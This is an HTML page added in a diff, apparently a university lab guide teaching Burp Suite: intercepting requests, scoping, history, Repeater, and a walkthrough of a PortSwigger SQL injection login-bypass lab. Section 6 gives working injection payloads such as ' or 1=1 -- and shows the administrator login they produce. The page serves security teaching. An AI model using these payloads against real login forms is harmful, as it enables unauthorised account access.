@@ -1,0 +1,276 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Burp Suite Guide — FIT2173</title>
+  <link rel="stylesheet" href="style.css">
+</head>
+<body>
+<nav>
+  <a href="/" class="logo">&#x1F512; FIT2173</a>
+  <a href="html-basics.html">HTML Basics</a>
+  <a href="login.html">SQLi Demo</a>
+  <a href="sqli.html">How SQLi Works</a>
+  <a href="burpsuite.html" class="active">Burp Suite</a>
+</nav>
+
+<div class="page">
+  <div class="badge" style="display:inline-block;background:rgba(88,166,255,0.15);color:var(--blue);border:1px solid rgba(88,166,255,0.3);padding:4px 12px;border-radius:20px;font-size:0.8rem;margin-bottom:1rem">Section 4 — Lab 7</div>
+  <h1>Burp Suite Guide</h1>
+  <p>Burp Suite is the industry-standard web proxy used by security professionals. It sits between your browser and the server, letting you intercept, inspect, and modify every HTTP request before it's sent.</p>
+
+  <!-- ── What is a Proxy ── -->
+  <h2>1. What is a Web Proxy?</h2>
+
+  <div style="background:var(--bg2);border:1px solid var(--border);border-radius:10px;padding:1.5rem;margin:1rem 0;text-align:center">
+    <div style="display:flex;align-items:center;justify-content:center;gap:1rem;flex-wrap:wrap;font-size:0.9rem">
+      <div style="background:var(--bg3);border:1px solid var(--border);border-radius:8px;padding:0.75rem 1.25rem;text-align:center">
+        <div style="font-size:1.5rem">&#x1F4BB;</div>
+        <div style="color:var(--text2);font-size:0.8rem;margin-top:4px">Your Browser</div>
+      </div>
+      <div style="color:var(--blue);font-size:1.2rem">&#x27A1;&#xFE0F;</div>
+      <div style="background:rgba(248,81,73,0.1);border:2px solid var(--red);border-radius:8px;padding:0.75rem 1.25rem;text-align:center">
+        <div style="font-size:1.5rem">&#x1F6E1;&#xFE0F;</div>
+        <div style="color:var(--red);font-weight:bold;font-size:0.8rem;margin-top:4px">Burp Suite</div>
+        <div style="color:var(--text2);font-size:0.75rem">localhost:8080</div>
+      </div>
+      <div style="color:var(--blue);font-size:1.2rem">&#x27A1;&#xFE0F;</div>
+      <div style="background:var(--bg3);border:1px solid var(--border);border-radius:8px;padding:0.75rem 1.25rem;text-align:center">
+        <div style="font-size:1.5rem">&#x1F30E;</div>
+        <div style="color:var(--text2);font-size:0.8rem;margin-top:4px">Web Server</div>
+      </div>
+    </div>
+    <p style="margin-top:1rem;margin-bottom:0;font-size:0.85rem">Burp Suite sits in the middle — it can read, stop, and modify any request or response.</p>
+  </div>
+
+  <p><strong>HTTP vs HTTPS:</strong> Standard HTTP is plaintext — easy to intercept. HTTPS is encrypted with TLS. Burp Suite handles HTTPS by acting as a <strong>man-in-the-middle</strong>: it generates its own certificates and its built-in browser is pre-configured to trust them, so it can decrypt and re-encrypt traffic transparently.</p>
+
+  <!-- ── Section 3.1: Intercept ── -->
+  <h2>2. Intercepting HTTP Traffic (Lab §3.1)</h2>
+
+  <div class="step">
+    <div class="step-num">1</div>
+    <div class="step-body">
+      <h3>Enable Interception</h3>
+      <p>In Burp Suite: <strong>Proxy</strong> tab → <strong>Intercept</strong> sub-tab → toggle to <code>Intercept on</code>. All outgoing requests will now pause and wait for your approval.</p>
+    </div>
+  </div>
+
+  <div class="step">
+    <div class="step-num">2</div>
+    <div class="step-body">
+      <h3>Make a Request in Burp's Browser</h3>
+      <p>Open the built-in browser (<strong>Proxy</strong> → <strong>Open browser</strong>) and navigate to a site. The page won't load — Burp has intercepted the request. You'll see the raw HTTP in the Intercept tab.</p>
+      <div class="http-block" style="margin-top:0.75rem">
+<span class="http-method">GET</span> <span class="http-path">/burp</span> HTTP/2
+<span class="http-header-name">Host:</span> <span class="http-header-val">portswigger.net</span>
+<span class="http-header-name">User-Agent:</span> <span class="http-header-val">Mozilla/5.0 (X11; Linux x86_64) ...</span>
+<span class="http-header-name">Accept:</span> <span class="http-header-val">text/html,application/xhtml+xml,*/*</span>
+<span class="http-header-name">Cookie:</span> <span class="http-header-val">session=abc123xyz...</span>
+      </div>
+    </div>
+  </div>
+
+  <div class="step">
+    <div class="step-num">3</div>
+    <div class="step-body">
+      <h3>Forward or Drop</h3>
+      <p>Click <strong>Forward</strong> to send the request on to the server. Click <strong>Forward</strong> again for any follow-up requests until the page loads. Click <strong>Drop</strong> to discard the request entirely.</p>
+    </div>
+  </div>
+
+  <div class="step">
+    <div class="step-num">4</div>
+    <div class="step-body">
+      <h3>Turn Off Interception</h3>
+      <p>Toggle back to <code>Intercept off</code>. Traffic will now flow through Burp without pausing — but it's still being logged in HTTP History.</p>
+    </div>
+  </div>
+
+  <!-- ── Section 3.2: Target Scope ── -->
+  <h2>3. Setting Target Scope (Lab §3.2)</h2>
+  <p>Your browser sends requests to dozens of third-party hosts (ads, analytics, CDNs). The target scope filters these out so you only see traffic to the site you're testing.</p>
+
+  <div class="step">
+    <div class="step-num">1</div>
+    <div class="step-body">
+      <h3>Add Site to Scope</h3>
+      <p>Go to <strong>Target</strong> → <strong>Site map</strong>. Right-click the target host in the left panel → <strong>Add to scope</strong>. When prompted, click <strong>Yes</strong> to stop logging out-of-scope traffic.</p>
+    </div>
+  </div>
+
+  <div class="step">
+    <div class="step-num">2</div>
+    <div class="step-body">
+      <h3>Filter HTTP History</h3>
+      <p>In <strong>Proxy</strong> → <strong>HTTP history</strong>, click the filter bar at the top and enable <strong>Show only in-scope items</strong>. Now you only see requests to your target.</p>
+    </div>
+  </div>
+
+  <!-- ── Section 3.3: HTTP History ── -->
+  <h2>4. HTTP History (Lab §3.1 Step 5)</h2>
+  <p>Even with Intercept off, every request passing through Burp is logged here. Click any row to see the full raw request on the left and the server response on the right. This lets you explore the site normally and review interactions afterwards.</p>
+
+  <div style="background:var(--bg2);border:1px solid var(--border);border-radius:10px;padding:1.25rem;margin:1rem 0">
+    <div style="font-size:0.78rem;color:var(--text2);text-transform:uppercase;letter-spacing:0.05em;margin-bottom:0.75rem">HTTP History columns</div>
+    <table style="width:100%;border-collapse:collapse;font-size:0.85rem">
+      <tr style="border-bottom:1px solid var(--border)">
+        <td style="padding:6px 10px;color:var(--purple);font-weight:bold">#</td>
+        <td style="padding:6px 10px;color:var(--text2)">Request number</td>
+      </tr>
+      <tr style="border-bottom:1px solid var(--border)">
+        <td style="padding:6px 10px;color:var(--purple);font-weight:bold">Method</td>
+        <td style="padding:6px 10px;color:var(--text2)">GET, POST, PUT, etc.</td>
+      </tr>
+      <tr style="border-bottom:1px solid var(--border)">
+        <td style="padding:6px 10px;color:var(--purple);font-weight:bold">URL</td>
+        <td style="padding:6px 10px;color:var(--text2)">The full path requested</td>
+      </tr>
+      <tr style="border-bottom:1px solid var(--border)">
+        <td style="padding:6px 10px;color:var(--purple);font-weight:bold">Status</td>
+        <td style="padding:6px 10px;color:var(--text2)">200 OK, 302 Redirect, 500 Error…</td>
+      </tr>
+      <tr>
+        <td style="padding:6px 10px;color:var(--purple);font-weight:bold">Length</td>
+        <td style="padding:6px 10px;color:var(--text2)">Response body size — unexpected changes can indicate injection</td>
+      </tr>
+    </table>
+  </div>
+
+  <!-- ── Section 3.3: Repeater ── -->
+  <h2>5. Burp Repeater (Lab §3.3)</h2>
+  <p>Repeater lets you re-send the same request as many times as you like, modifying parameters each time. This is essential for probing vulnerabilities without having to navigate the UI repeatedly.</p>
+
+  <div class="step">
+    <div class="step-num">1</div>
+    <div class="step-body">
+      <h3>Send to Repeater</h3>
+      <p>In HTTP History, right-click any request → <strong>Send to Repeater</strong> (or <kbd style="background:var(--bg3);border:1px solid var(--border);padding:2px 6px;border-radius:4px;font-size:0.82rem">Ctrl+R</kbd>).</p>
+    </div>
+  </div>
+
+  <div class="step">
+    <div class="step-num">2</div>
+    <div class="step-body">
+      <h3>Modify and Resend</h3>
+      <p>In the <strong>Repeater</strong> tab, edit any part of the request — headers, body, URL parameters — then click <strong>Send</strong>. The response appears on the right. Compare responses to discover vulnerabilities.</p>
+    </div>
+  </div>
+
+  <!-- ── SQLi with Burp ── -->
+  <h2>6. Performing SQL Injection with Burp Suite (Lab §4)</h2>
+  <p>Here's the complete workflow for the PortSwigger login bypass lab:</p>
+
+  <div class="step">
+    <div class="step-num">1</div>
+    <div class="step-body">
+      <h3>Intercept the Login POST</h3>
+      <p>Turn Intercept on. Submit the login form with any credentials. Burp catches the POST request:</p>
+      <div class="http-block" style="margin-top:0.75rem">
+<span class="http-method">POST</span> <span class="http-path">/login</span> HTTP/2
+<span class="http-header-name">Host:</span> <span class="http-header-val">0a6f00fc04138618...web-security-academy.net</span>
+<span class="http-header-name">Content-Type:</span> <span class="http-header-val">application/x-www-form-urlencoded</span>
+<span class="http-header-name">Content-Length:</span> <span class="http-header-val">69</span>
+
+<span class="http-body">csrf=abc123&amp;username=<span class="http-highlight">some_user</span>&amp;password=some_password</span>
+      </div>
+    </div>
+  </div>
+
+  <div class="step">
+    <div class="step-num">2</div>
+    <div class="step-body">
+      <h3>Probe with a Single Quote</h3>
+      <p>Change the username value to <code>'</code> and click <strong>Forward</strong>. A <strong>500 Internal Server Error</strong> confirms the field is injectable — the quote broke the SQL syntax.</p>
+      <div class="http-block" style="margin-top:0.75rem">
+<span class="http-body">csrf=abc123&amp;username=<span class="http-highlight">'</span>&amp;password=anything</span>
+
+<span style="color:var(--text2)"># Server responds:</span>
+<span style="color:var(--red)">HTTP/2 500 Internal Server Error</span>
+      </div>
+    </div>
+  </div>
+
+  <div class="step">
+    <div class="step-num">3</div>
+    <div class="step-body">
+      <h3>Inject the Bypass Payload</h3>
+      <p>Change the username to <code>' or 1=1 -- </code> (note the space after <code>--</code>) and forward. The password check is bypassed and you're logged in as <strong>administrator</strong>.</p>
+      <div class="http-block" style="margin-top:0.75rem">
+<span class="http-body">csrf=abc123&amp;username=<span class="http-highlight">' or 1=1 -- </span>&amp;password=anything</span>
+
+<span style="color:var(--text2)"># Server responds:</span>
+<span style="color:var(--green)">HTTP/2 302 Found</span>
+<span class="http-header-name">Location:</span> <span class="http-header-val">/my-account?id=administrator</span>
+      </div>
+      <div class="alert alert-warning" style="margin-top:0.75rem">
+        <strong>URL encoding:</strong> In the raw Burp request you'll see <code>%27or+1%3D1+--+</code> — this is the URL-encoded form of <code>'or 1=1 -- </code>. Burp handles the encoding automatically.
+      </div>
+    </div>
+  </div>
+
+  <div class="step">
+    <div class="step-num">4</div>
+    <div class="step-body">
+      <h3>Use Repeater to Iterate Faster</h3>
+      <p>Send the login POST to Repeater. Now you can try different payloads without enabling/disabling intercept each time. Ideal for testing variations like <code>' or '1'='1</code>, <code>' or 1=1#</code>, etc.</p>
+    </div>
+  </div>
+
+  <!-- ── Quick Ref ── -->
+  <h2>7. Burp Suite Quick Reference</h2>
+
+  <table style="width:100%;border-collapse:collapse;font-size:0.88rem;margin-top:0.5rem">
+    <thead>
+      <tr style="border-bottom:1px solid var(--border)">
+        <th style="text-align:left;padding:8px 12px;color:var(--text2)">Tab / Feature</th>
+        <th style="text-align:left;padding:8px 12px;color:var(--text2)">What it does</th>
+        <th style="text-align:left;padding:8px 12px;color:var(--text2)">Shortcut</th>
+      </tr>
+    </thead>
+    <tbody>
+      <tr style="border-bottom:1px solid var(--border)">
+        <td style="padding:8px 12px;color:var(--blue)">Proxy → Intercept</td>
+        <td style="padding:8px 12px;color:var(--text2)">Pause requests and edit them before forwarding</td>
+        <td style="padding:8px 12px"><code>—</code></td>
+      </tr>
+      <tr style="border-bottom:1px solid var(--border)">
+        <td style="padding:8px 12px;color:var(--blue)">Proxy → HTTP history</td>
+        <td style="padding:8px 12px;color:var(--text2)">Log of all requests/responses through the proxy</td>
+        <td style="padding:8px 12px"><code>—</code></td>
+      </tr>
+      <tr style="border-bottom:1px solid var(--border)">
+        <td style="padding:8px 12px;color:var(--blue)">Send to Repeater</td>
+        <td style="padding:8px 12px;color:var(--text2)">Send a request to Repeater for manual re-testing</td>
+        <td style="padding:8px 12px"><code>Ctrl+R</code></td>
+      </tr>
+      <tr style="border-bottom:1px solid var(--border)">
+        <td style="padding:8px 12px;color:var(--blue)">Repeater → Send</td>
+        <td style="padding:8px 12px;color:var(--text2)">Re-send the current request and view response</td>
+        <td style="padding:8px 12px"><code>Ctrl+Enter</code></td>
+      </tr>
+      <tr style="border-bottom:1px solid var(--border)">
+        <td style="padding:8px 12px;color:var(--blue)">Send to Intruder</td>
+        <td style="padding:8px 12px;color:var(--text2)">Automated payload fuzzing (brute-force, wordlists)</td>
+        <td style="padding:8px 12px"><code>Ctrl+I</code></td>
+      </tr>
+      <tr>
+        <td style="padding:8px 12px;color:var(--blue)">Target → Site map</td>
+        <td style="padding:8px 12px;color:var(--text2)">Visual map of all discovered content on a site</td>
+        <td style="padding:8px 12px"><code>—</code></td>
+      </tr>
+    </tbody>
+  </table>
+
+  <div class="alert alert-info" style="margin-top:2rem">
+    <strong>Practice:</strong> The PortSwigger Web Security Academy has free interactive labs. Start with the two SQL injection labs from this lab sheet, then explore XSS, CSRF, and authentication vulnerabilities.
+  </div>
+
+  <a href="login.html" class="btn btn-danger" style="margin-top:1rem;margin-right:0.75rem">Try the SQLi Demo →</a>
+  <a href="/" class="btn btn-ghost" style="margin-top:1rem">Back to Home</a>
+</div>
+
+<script src="demo.js"></script>
+</body>
+</html>
